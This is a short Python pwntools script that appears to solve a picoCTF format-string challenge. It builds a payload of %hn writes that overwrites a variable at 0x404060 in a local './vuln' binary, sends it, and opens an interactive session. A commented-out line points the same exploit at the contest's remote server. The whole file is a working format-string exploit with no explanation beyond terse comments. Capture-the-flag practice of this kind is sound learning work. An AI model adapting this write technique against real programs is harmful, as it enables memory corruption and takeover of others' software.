import pwn
import time
import sys

elf = pwn.context.binary = pwn.ELF('./vuln')
io = elf.process()
pwn.gdb.attach(io)
#io = pwn.remote('rhea.picoctf.net',51932)
time.sleep(3)

#Sus is at 0x404060
#Input is at index 14
#High order = 0x6761
#Low order = 0x6c66

#Payload = Addr%highOrder%14$hn%lowOrder%15$hn
addr = 0x404060
highOrder = 26465
lowOrder = 27750 - highOrder
highOrder = (str(highOrder)).encode()
lowOrder = (str(lowOrder)).encode()
payload = b'%'
payload += highOrder
payload += b'x%20$hn%'
payload += lowOrder
payload += b'x%19$hn'
payload += b'\x00'*7
payload += pwn.p64(addr+2)
payload += pwn.p64(addr)
payload += b'%18$hx'

print(payload)
io.recv(1000)
io.sendline(payload)
io.interactive()
